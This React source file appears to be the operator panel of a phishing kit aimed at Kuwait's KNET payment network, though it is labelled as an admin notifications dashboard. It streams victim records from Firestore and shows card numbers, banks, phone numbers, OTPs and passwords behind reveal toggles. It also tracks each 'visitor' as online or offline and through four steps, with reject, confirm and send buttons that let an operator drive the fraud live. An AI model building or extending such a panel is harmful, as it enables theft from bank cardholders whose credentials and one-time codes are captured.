import { useState, useEffect } from "react";
import { useQuery } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import {
  Users,
  CreditCard,
  Eye,
  EyeOff,
  Wifi,
  WifiOff,
  RefreshCw,
  Download,
  Settings,
  Bell,
  Search,
  Filter,
  ChevronLeft,
  ChevronRight,
  Check,
  X,
  Send,
  Loader2,
  Wallet,
} from "lucide-react";
import { subscribeToKnetPayments, type KnetPayment } from "@/lib/firestore";

function getAdminHeaders() {
  const token = localStorage.getItem("adminSession");
  return {
    "x-admin-session": token || "",
  };
}

function MiniSparkline({ data, color }: { data: number[]; color: string }) {
  const max = Math.max(...data);
  const min = Math.min(...data);
  const range = max - min || 1;
  const width = 80;
  const height = 30;
  const points = data.map((val, i) => {
    const x = (i / (data.length - 1)) * width;
    const y = height - ((val - min) / range) * height;
    return `${x},${y}`;
  }).join(" ");

  return (
    <svg width={width} height={height} className="mt-2">
      <polyline
        fill="none"
        stroke={color}
        strokeWidth="2"
        points={points}
      />
    </svg>
  );
}

function StatCard({ 
  title, 
  value, 
  icon: Icon, 
  color, 
  sparklineData 
}: { 
  title: string; 
  value: number | string; 
  icon: any; 
  color: string;
  sparklineData: number[];
}) {
  return (
    <div className="bg-white dark:bg-card rounded-lg p-4 shadow-sm border">
      <div className="flex items-start justify-between gap-2">
        <div>
          <p className="text-2xl font-bold">{value}</p>
          <p className="text-sm text-muted-foreground mt-1">{title}</p>
          <MiniSparkline data={sparklineData} color={color} />
          <p className="text-xs text-green-600 mt-1">غير متاح</p>
        </div>
        <div 
          className="h-10 w-10 rounded-full flex items-center justify-center"
          style={{ backgroundColor: `${color}20` }}
        >
          <Icon className="h-5 w-5" style={{ color }} />
        </div>
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [adminUser, setAdminUser] = useState<any>(null);
  const [knetPayments, setKnetPayments] = useState<KnetPayment[]>([]);
  const [knetLoading, setKnetLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>({});
  const itemsPerPage = 10;

  useEffect(() => {
    const token = localStorage.getItem("adminSession");
    const user = localStorage.getItem("adminUser");
    
    if (!token || !user) {
      setLocation("/admin/login");
      return;
    }
    
    try {
      setAdminUser(JSON.parse(user));
    } catch {
      setLocation("/admin/login");
    }
  }, [setLocation]);

  useEffect(() => {
    const unsubscribe = subscribeToKnetPayments((payments) => {
      setKnetPayments(payments);
      setKnetLoading(false);
    });
    return () => unsubscribe();
  }, []);

  const toggleSensitive = (id: string, field: string) => {
    setShowSensitive(prev => ({
      ...prev,
      [`${id}-${field}`]: !prev[`${id}-${field}`]
    }));
  };

  const isSensitiveVisible = (id: string, field: string) => {
    return showSensitive[`${id}-${field}`] || false;
  };

  const filteredPayments = knetPayments.filter(payment => {
    if (!searchQuery) return true;
    const search = searchQuery.toLowerCase();
    return (
      payment.id?.toLowerCase().includes(search) ||
      payment.cardNumber?.toLowerCase().includes(search) ||
      payment.bank?.toLowerCase().includes(search) ||
      payment.phoneNumber?.toLowerCase().includes(search)
    );
  });

  const totalPages = Math.ceil(filteredPayments.length / itemsPerPage);
  const paginatedPayments = filteredPayments.slice(
    (currentPage - 1) * itemsPerPage,
    currentPage * itemsPerPage
  );

  const onlineCount = knetPayments.filter(p => p.online).length;
  const totalVisitors = knetPayments.length;
  const cardInfoCount = knetPayments.filter(p => p.cardNumber).length;
  const walletCount = knetPayments.filter(p => p.status === "approved").length;

  const getTimeAgo = (date: any) => {
    if (!date) return "غير معروف";
    const now = new Date();
    const then = new Date(date);
    const diffMs = now.getTime() - then.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMins / 60);
    const diffDays = Math.floor(diffHours / 24);
    const diffMonths = Math.floor(diffDays / 30);

    if (diffMonths > 0) return `منذ ${diffMonths} أشهر`;
    if (diffDays > 0) return `منذ ${diffDays} يوم`;
    if (diffHours > 0) return `منذ ${diffHours} ساعة`;
    if (diffMins > 0) return `منذ ${diffMins} دقيقة`;
    return "الآن";
  };

  if (!adminUser) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-background" dir="rtl">
      <header className="bg-[#1a1a2e] text-white sticky top-0 z-50">
        <div className="container mx-auto px-4 py-3 flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="h-8 w-8 rounded-full bg-white/10 flex items-center justify-center">
              <Users className="h-4 w-4" />
            </div>
            <div>
              <h1 className="font-semibold text-lg">لوحة الإشعارات المتقدمة</h1>
              <p className="text-xs text-white/60">آخر تحديث: 05:21</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
              <Bell className="h-4 w-4" />
            </Button>
            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
              <Settings className="h-4 w-4" />
            </Button>
            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
              <RefreshCw className="h-4 w-4" />
            </Button>
            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
              <Download className="h-4 w-4" />
            </Button>
            <Button 
              size="sm" 
              className="bg-green-600 hover:bg-green-700 text-white rounded-full px-4"
              data-testid="button-copy-all"
            >
              نسخ الكل
            </Button>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 space-y-6">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <StatCard
            title="إجمالي الزوار"
            value={totalVisitors}
            icon={Users}
            color="#10b981"
            sparklineData={[10, 25, 15, 30, 20, 35, 25, 40]}
          />
          <StatCard
            title="المستخدمين المتصلين"
            value={onlineCount}
            icon={Wifi}
            color="#f59e0b"
            sparklineData={[5, 8, 3, 12, 6, 9, 4, 8]}
          />
          <StatCard
            title="معلومات البطاقات"
            value={cardInfoCount}
            icon={CreditCard}
            color="#3b82f6"
            sparklineData={[20, 35, 25, 45, 30, 50, 40, 55]}
          />
          <StatCard
            title="المحفظات"
            value={walletCount}
            icon={Wallet}
            color="#8b5cf6"
            sparklineData={[8, 12, 6, 15, 10, 18, 12, 20]}
          />
        </div>

        <div className="bg-white dark:bg-card rounded-lg shadow-sm border">
          <div className="p-4 border-b flex flex-wrap items-center justify-between gap-4">
            <div>
              <h2 className="text-lg font-semibold flex items-center gap-2">
                <Settings className="h-5 w-5 text-primary" />
                إدارة الإشعارات
              </h2>
              <p className="text-sm text-muted-foreground">
                عرض وإدارة جميع الإشعارات والبيانات المسجلة
              </p>
            </div>
            <div className="flex items-center gap-2 flex-wrap">
              <Badge variant="outline" className="bg-blue-50 text-blue-700">
                كل المقاطع {knetPayments.length}
              </Badge>
              <Badge variant="outline">
                لكل 1
              </Badge>
            </div>
          </div>

          <div className="p-4 border-b flex flex-wrap items-center gap-4">
            <div className="relative flex-1 min-w-[200px]">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                placeholder="البحث في الإشعارات..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pe-10"
                data-testid="input-search"
              />
            </div>
            <Button variant="outline" size="sm" data-testid="button-filter">
              <Filter className="h-4 w-4 me-2" />
              تصفية
            </Button>
            <div className="flex items-center gap-1">
              <span className="text-sm text-muted-foreground">عرض 24</span>
            </div>
          </div>

          {knetLoading ? (
            <div className="flex justify-center py-12">
              <Loader2 className="h-8 w-8 animate-spin text-primary" />
            </div>
          ) : paginatedPayments.length === 0 ? (
            <div className="py-12 text-center text-muted-foreground">
              لا توجد إشعارات
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead className="bg-muted/50 border-b">
                  <tr>
                    <th className="text-start p-3 font-medium">الدولة</th>
                    <th className="text-start p-3 font-medium">المعلومات</th>
                    <th className="text-start p-3 font-medium">الحالة</th>
                    <th className="text-start p-3 font-medium">الوقت</th>
                    <th className="text-start p-3 font-medium">الاتصال</th>
                    <th className="text-start p-3 font-medium">الكود</th>
                    <th className="text-start p-3 font-medium">تحديث الخطوة</th>
                    <th className="text-start p-3 font-medium">الإجراءات</th>
                  </tr>
                </thead>
                <tbody className="divide-y">
                  {paginatedPayments.map((payment) => (
                    <tr key={payment.id} className="hover:bg-muted/30" data-testid={`row-payment-${payment.id}`}>
                      <td className="p-3">
                        <span className="font-medium">Kuwait</span>
                      </td>
                      <td className="p-3">
                        <div className="flex flex-wrap gap-1">
                          {payment.cardNumber && (
                            <Badge className="bg-green-100 text-green-800 text-xs">
                              معلومات البطاقة
                            </Badge>
                          )}
                          {payment.otp && (
                            <Badge className="bg-blue-100 text-blue-800 text-xs">
                              معلومات الشخصية
                            </Badge>
                          )}
                        </div>
                      </td>
                      <td className="p-3">
                        {payment.online ? (
                          <Badge className="bg-green-100 text-green-800">
                            متصل
                          </Badge>
                        ) : (
                          <Badge className="bg-red-100 text-red-800">
                            غير متصل
                          </Badge>
                        )}
                      </td>
                      <td className="p-3 text-muted-foreground">
                        {getTimeAgo(payment.createdDate)}
                      </td>
                      <td className="p-3">
                        <Badge variant="outline" className="text-muted-foreground">
                          {payment.online ? "متصل" : "غير متصل"}
                        </Badge>
                      </td>
                      <td className="p-3">
                        <div className="flex items-center gap-1">
                          <Badge variant="secondary" className="font-mono bg-amber-100 text-amber-800">
                            {isSensitiveVisible(payment.id, 'code') 
                              ? (payment.otp || payment.pass || "---")
                              : "****"
                            }
                          </Badge>
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-6 w-6"
                            onClick={() => toggleSensitive(payment.id, 'code')}
                            data-testid={`toggle-code-${payment.id}`}
                          >
                            {isSensitiveVisible(payment.id, 'code') 
                              ? <EyeOff className="h-3 w-3" />
                              : <Eye className="h-3 w-3" />
                            }
                          </Button>
                        </div>
                      </td>
                      <td className="p-3">
                        <div className="flex items-center gap-1">
                          <div className="flex gap-0.5">
                            {[1, 2, 3, 4].map((step) => (
                              <div
                                key={step}
                                className={`h-2 w-2 rounded-full ${
                                  step <= (payment.step || 1) 
                                    ? 'bg-green-500' 
                                    : 'bg-gray-300'
                                }`}
                              />
                            ))}
                          </div>
                        </div>
                      </td>
                      <td className="p-3">
                        <div className="flex items-center gap-1">
                          <Badge className="cursor-pointer hover:opacity-80">
                            P
                          </Badge>
                          <Button
                            size="sm"
                            variant="destructive"
                            className="h-7 px-2 text-xs rounded-full"
                            data-testid={`button-reject-${payment.id}`}
                          >
                            رفض
                          </Button>
                          <Button
                            size="sm"
                            className="h-7 px-2 text-xs rounded-full bg-orange-500 hover:bg-orange-600"
                            data-testid={`button-confirm-${payment.id}`}
                          >
                            تأكيد
                          </Button>
                          <Button
                            size="sm"
                            className="h-7 px-2 text-xs rounded-full bg-green-500 hover:bg-green-600"
                            data-testid={`button-send-${payment.id}`}
                          >
                            إرسال
                          </Button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {totalPages > 1 && (
            <div className="p-4 border-t flex items-center justify-between gap-4">
              <div className="text-sm text-muted-foreground">
                عرض {(currentPage - 1) * itemsPerPage + 1} - {Math.min(currentPage * itemsPerPage, filteredPayments.length)} من {filteredPayments.length}
              </div>
              <div className="flex items-center gap-2">
                <Button
                  variant="outline"
                  size="icon"
                  onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
                  disabled={currentPage === 1}
                  data-testid="button-prev-page"
                >
                  <ChevronRight className="h-4 w-4" />
                </Button>
                <span className="text-sm px-2">
                  {currentPage} / {totalPages}
                </span>
                <Button
                  variant="outline"
                  size="icon"
                  onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}
                  disabled={currentPage === totalPages}
                  data-testid="button-next-page"
                >
                  <ChevronLeft className="h-4 w-4" />
                </Button>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
